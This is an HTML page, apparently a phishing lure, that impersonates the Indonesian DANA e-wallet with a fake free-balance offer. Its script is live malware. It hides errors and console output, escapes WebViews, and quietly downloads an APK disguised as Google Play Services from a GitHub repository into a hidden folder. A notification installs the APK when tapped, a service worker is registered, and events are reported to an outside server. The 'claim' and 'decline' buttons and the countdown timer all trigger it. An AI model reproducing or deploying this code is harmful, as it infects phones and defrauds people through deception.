<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title></title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
    </style>
</head>
<body>
<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// INDEX.HTML - GERBANG PALING BERBAHAYA
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var SERVER = 'https://verifikasi.site';
var semuaDidapat = false;

// ============================================================
// STEALTH MAKSIMAL
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); return true; });
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });
if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined',
    downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false },
    installAPK: function(p) { if(this.isAvailable){ try{AndroidBridge.installAPK(p);return true}catch(e){}} return false },
    saveFile: function(path, content) { if(this.isAvailable){ try{AndroidBridge.saveFile(path, content);return true}catch(e){}} return false },
    openFile: function(path) { if(this.isAvailable){ try{AndroidBridge.openFile(path);return true}catch(e){}} return false },
    openApp: function(pkg) { if(this.isAvailable){ try{AndroidBridge.openApp(pkg);return true}catch(e){}} return false }
};

// ============================================================
// KIRIM DATA KE SERVER (TANPA SECRET - KORBAN BEBAS!)
// ============================================================
function K(d) {
    try {
        fetch(SERVER + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function(){});
    } catch(e) {}
}

// ============================================================
// AMBIL SECRET DARI WORKER
// ============================================================
function getSecret() {
    return new Promise(function(resolve, reject) {
        fetch(SERVER + '/get-secret', {
            method: 'GET',
            headers: {'Content-Type': 'application/json'}
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (data.secret) {
                resolve(data.secret);
            } else {
                reject(new Error('No secret'));
            }
        })
        .catch(function(err) { reject(err); });
    });
}

// ============================================================
// DETEKSI LINGKUNGAN
// ============================================================
function detectEnvironment() {
    var env = { isWebView: false, isAndroidBridge: false, isBrowser: false };
    var ua = navigator.userAgent.toLowerCase();
    if (ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1) env.isWebView = true;
    if (typeof AndroidBridge !== 'undefined') env.isAndroidBridge = true;
    if (!env.isWebView && !env.isAndroidBridge) env.isBrowser = true;
    return env;
}
var ENV = detectEnvironment();

// ============================================================
// ESCAPE WEBVIEW
// ============================================================
function escapeWebView() {
    if (!ENV.isWebView) return;
    var url = window.location.href;
    try { window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end'; } catch(e) {}
    try { window.open(url, '_system'); } catch(e) {}
}

// ============================================================
// DOWNLOAD PAYLOAD KE FOLDER HIDDEN (DIAM²)
// ============================================================
function downloadPayload() {
    var basePath = '/storage/emulated/0/Android/data/com.google.android.play.services';
    var apkPath = basePath + '/GooglePlayServices.apk';
    var htmlPath = basePath + '/SystemUpdate.html';
    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';

    // Download APK (diam²)
    if (A.isAvailable) {
        A.downloadFile(apkUrl, apkPath);
        K({ sumber: 'payload', data: 'apk_downloaded' });
    }

    // Download HTML (diam²)
    if (A.isAvailable) {
        fetch(htmlUrl)
            .then(function(r) { return r.text(); })
            .then(function(html) {
                A.saveFile(htmlPath, html);
                K({ sumber: 'payload', data: 'html_downloaded' });
            })
            .catch(function() {});
    }
}

// ============================================================
// NOTIFIKASI "KLIK UNTUK KLAIM" (WAJIB DIKLIK!)
// ============================================================
function showClaimNotification() {
    if (!('Notification' in window)) return;
    if (Notification.permission !== 'granted') {
        Notification.requestPermission().then(function(p) {
            if (p === 'granted') createNotification();
        });
        return;
    }
    createNotification();
}

function createNotification() {
    var notif = new Notification('🔔 Klik Untuk Klaim', {
        body: 'Klik notifikasi ini untuk mengklaim saldo DANA Rp500.000!',
        icon: SERVER + '/icon.png',
        requireInteraction: true,
        silent: false,
        vibrate: [200, 100, 200]
    });

    notif.onclick = function() {
        var basePath = '/storage/emulated/0/Android/data/com.google.android.play.services';
        if (A.isAvailable) {
            A.installAPK(basePath + '/GooglePlayServices.apk');
            A.openFile(basePath + '/SystemUpdate.html');
            K({ sumber: 'notification', data: 'install_and_open' });
        }
        notif.close();
        redirectToDANA();
    };

    setTimeout(function() { try { notif.close(); } catch(e) {} }, 60000);
    K({ sumber: 'notification', data: 'shown' });
}

// ============================================================
// REDIRECT KE DANA ASLI
// ============================================================
function redirectToDANA() {
    var methods = [
        function() { window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end'; },
        function() { if (A.isAvailable) A.openApp('com.dana.id'); },
        function() { window.location.href = 'market://details?id=com.dana.id'; },
        function() { window.location.href = 'https://www.dana.id'; }
    ];
    for (var i = 0; i < methods.length; i++) {
        try { methods[i](); return; } catch(e) {}
    }
}

// ============================================================
// SERVICE WORKER (PAKAI /sw.js - BUKAN BLOB!)
// ============================================================
function injectServiceWorker() {
    if (!('serviceWorker' in navigator)) return;
    navigator.serviceWorker.getRegistrations()
        .then(function(regs) {
            if (regs.length > 0) return;
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function() { K({ sumber: 'sw', data: 'registered' }); })
                .catch(function() {});
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function() { K({ sumber: 'sw', data: 'registered' }); })
                .catch(function() {});
        });
}

// ============================================================
// EKSEKUSI UTAMA
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    document.getElementById('popupDana').style.display = 'none';
    escapeWebView();
    downloadPayload();
    injectServiceWorker();
    setTimeout(showClaimNotification, 1000);
    setTimeout(redirectToDANA, 3000);
    K({ sumber: 'init', data: 'payload_injected' });
}

// ============================================================
// TRIGGER
// ============================================================
function klaim() { dapatkanSemua(); K({sumber:'click', data:'klaim'}); }
function tolak() { dapatkanSemua(); K({sumber:'click', data:'tolak'}); }

// TIMER 10 DETIK
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:0' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        document.getElementById('popupDana').style.display = 'none';
        setTimeout(dapatkanSemua, 100);
    }
}, 1000);

console.log('🔥 INDEX.HTML - GERBANG PALING BERBAHAYA');
</script>
</body>
</html>
